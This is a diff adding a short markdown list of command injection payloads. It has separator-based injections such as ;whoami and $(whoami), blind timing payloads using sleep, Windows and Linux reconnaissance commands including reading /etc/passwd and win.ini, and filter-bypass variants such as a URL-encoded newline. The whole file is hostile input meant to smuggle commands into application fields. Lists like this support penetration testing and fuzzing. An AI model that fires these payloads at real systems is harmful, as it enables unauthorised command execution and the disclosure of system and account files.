@@ -1,0 +1,33 @@
+# Command Injection Payloads
+
+## Basic Payloads
+;whoami
+|whoami
+&whoami
+`whoami`
+$(whoami)
+
+## Blind Command Injection
+; sleep 5
+| sleep 5
+& sleep 5
+&& sleep 5
+
+## Windows Commands
+type C:\Windows\win.ini
+dir
+ipconfig
+net user
+
+## Linux Commands
+cat /etc/passwd
+ls -la /var/www
+id
+uname -a
+
+## Bypass Filters
+whoami;ls
+whoami|ls
+whoami&&ls
+whoami||ls
+whoami%0als
